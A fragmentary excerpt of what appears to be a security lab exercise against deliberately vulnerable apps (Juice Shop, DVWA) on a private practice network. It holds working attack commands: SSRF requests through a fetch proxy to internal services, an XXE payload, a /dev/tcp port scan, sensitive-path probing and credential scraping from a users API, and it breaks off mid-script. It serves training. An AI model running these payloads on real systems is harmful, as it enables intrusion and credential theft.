...
| web | 10.20.32.80 (dmz) + 10.20.40.80 (int) | Juice Shop/DVWA 대상 (Apache + ModSecurity, dual NIC = vhost 라우팅) | `ssh 6v6-web` (ProxyJump fw) |
...
curl -s "http://localhost:7777/fetch?url=http://10.20.40.81:3000/" 2>/dev/null | head -5

echo ""
echo "--- SSRF: 내부 SubAgent API 접근 ---"
curl -s "http://localhost:7777/fetch?url=http://10.20.32.80:8002/" 2>/dev/null | head -5
...
curl -s -X POST http://localhost:7778/ \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.20.40.81:3000/">]><user><name>&xxe;</name></user>'
...
curl -s -D- http://10.20.40.81:3000/ 2>/dev/null | grep -i "set-cookie" || echo "쿠키 없음"
```
...
for port in 22 80 3000 5432 8002 9200 9300; do
  RESULT=$(timeout 2 bash -c "echo >/dev/tcp/10.20.32.80/$port" 2>/dev/null && echo "open" || echo "closed")
  echo "  10.20.32.80:$port → $RESULT"
done

echo ""
echo "[Chain 4] 민감 파일 접근 시도"
# Juice Shop의 알려진 민감 경로
curl -s http://10.20.40.81:3000/ftp 2>/dev/null | head -5

echo ""
echo "[Chain 5] 크레덴셜 검색"
# 공개 API에서 사용자 정보
curl -s http://10.20.40.81:3000/api/Users/ 2>/dev/null | python3 -c "
import sys,json
try:
